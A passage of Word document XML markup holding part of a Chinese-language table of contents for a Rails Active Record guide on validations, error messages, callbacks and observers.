            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">使用 Proc 作为 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:if</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 和 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:unless</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 的参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1799B0E4"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60" w:anchor="6-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>校验按条件分组</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7E23DF75"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61" w:anchor="6-5" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>组合校验条件</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41409A64"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62" w:anchor="7" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>自定义校验</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="666FD727"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63" w:anchor="7-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>自定义校验器</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6B9DD16D"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64" w:anchor="7-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>自定义校验方法</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="20782FC5"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65" w:anchor="8" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>获取和使用校验错误信息</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3DCD6512"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66" w:anchor="working_with_validation_errors-errors" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>errors</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0BAB287A"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67" w:anchor="working_with_validation_errors-errors-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>errors[]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="403C87FE"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68" w:anchor="8-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>errors.add</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D39F389"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69" w:anchor="8-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>errors[:base]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6340CDEC"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70" w:anchor="8-5" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>errors.clear</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4828BA04"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71" w:anchor="8-6" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>errors.size</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5D74F8C7"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72" w:anchor="9" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>在View中展示校验错误信息</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6B78D583"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73" w:anchor="9-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>error_messages</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 和 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>error_messages_for</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="15A40006"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74" w:anchor="customizing-error-messages-css" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>定制错误信息的 CSS</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4FA19C5A"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75" w:anchor="9-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>自定义错误信息的 HTML</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="05F80F0D"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76" w:anchor="10" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>回调简介</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="18661DD9"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77" w:anchor="10-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>回调注册</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2093C32F"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78" w:anchor="11" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>有效的回调</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5FB3A223"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79" w:anchor="11-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建对象时</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="095FFE2C"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80" w:anchor="11-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>更新对象时</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="42A68F36"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81" w:anchor="11-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>销毁对象时</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AD0F16C"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82" w:anchor="11-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>after_initialize</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve"> 和 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>after_find</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0CCA77CE"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83" w:anchor="12" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>执行回调</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4E62DCD2"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84" w:anchor="13" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>跳过回调</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="41BE4CF7"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85" w:anchor="14" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>执行挂起</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C9B700E"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86" w:anchor="15" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>关联回调</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="32269823"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87" w:anchor="16" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>有条件的回调</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DA74265"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88" w:anchor="16-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:Symbol</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>作为</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:if</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>和</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:unless</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>的参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="64AAE1B3"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89" w:anchor="16-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t xml:space="preserve">使用String作为 </w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:if</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>和</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:unless</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>的参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0AA17509"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90" w:anchor="16-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>使用</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>Proc</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>作为</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:if</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>和</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
          </w:rPr>
          <w:t>:unless</w:t>
        </w:r>
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>的参数</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6F13880C"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91" w:anchor="16-4" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>回调前有多个条件判断</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B5733E3"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92" w:anchor="17" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>回调类</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B6E6B4C"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93" w:anchor="18" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>观察者</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="161728AA"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94" w:anchor="18-1" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>创建观察者</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="117FC45F"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95" w:anchor="18-2" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>注册观察者</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6D9D3658" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="27"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId196" w:anchor="18-3" w:history="1">
        <w:r w:rsidR="002A2B82" w:rsidRPr="002A2B82">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>分享观察者</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="433AB2E6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRPr="002A2B82" w:rsidRDefault="008938C9" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="27"/>
